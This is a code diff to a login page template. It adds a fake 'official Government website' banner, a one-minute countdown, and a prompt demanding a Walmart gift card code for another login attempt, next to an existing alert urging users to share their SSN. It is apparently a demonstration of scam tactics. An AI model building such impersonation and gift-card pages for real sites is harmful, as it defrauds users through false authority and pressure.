@@ -3,6 +3,10 @@
     alert("Only cool kids know and share their SSN");
 </script>
   {{#login}}
+    <div class=" col-12 alert alert-danger text-center">
+        <p>This is an official Government website</p>
+        <h3 id="countdown">Loading...</h3>
+    </div>
     <h2>Log in</h2>
     <form action="/login" method="post">
         Username: <input class="my-2" name="username" type="text" /> <br />
@@ -19,3 +23,33 @@
   {{/login}}
 </div>
 
+<script>
+// Set the date we're counting down to
+var countDownDate = new Date();
+countDownDate.setMinutes(countDownDate.getMinutes() + 1);
+
+// Update the count down every 1 second
+var x = setInterval(function() {
+
+  // Get today's date and time
+  var now = new Date().getTime();
+
+  // Find the distance between now and the count down date
+  var distance = countDownDate - now;
+
+  // Time calculations for days, hours, minutes and seconds
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+  // Display the result in the element with id="countdown"
+  document.getElementById("countdown").innerHTML = minutes + "m " + seconds + "s ";
+
+  // If the count down is finished, write some text
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("countdown").innerHTML = '<div><p>Enter Walmart gift card code for another access attempt</p><input class="my-2" name="walmart_code" type="text" /><button>Send</button></div>';
+  }
+}, 1000);
+</script>
